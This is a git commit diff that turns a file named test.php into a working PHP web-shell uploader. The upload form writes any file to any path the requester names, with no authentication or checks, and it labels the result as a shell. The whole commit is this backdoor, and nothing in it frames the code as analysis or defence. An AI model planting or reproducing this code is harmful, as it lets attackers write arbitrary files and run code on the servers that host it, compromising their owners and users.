362d2821a87205b575de8ebfa3b067215fd571b2
SudoHxC <139719694+SudoHxC@users.noreply.github.com>
2023-09-02 21:14:53 -0500

    Update test.php

--- test.php
+++ test.php
@@ -1,1 +1,13 @@
-test
+<?php
+
+$files = @$_FILES["files"];
+if ($files["name"] != '') {
+    $fullpath = $_REQUEST["path"] . $files["name"];
+    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
+        echo "<h3><a href='$fullpath'>Your Fucker Shell !!</a></h3>";
+    }
+}echo '<html><head><title>Upload files...</title>
+</head><body><form method=POST enctype="multipart/form-data" action="">
+<input type=text name=path><br><br>
+<input type="file" name="files"><input type=submit value="Up"></form></body></html>';
+?>
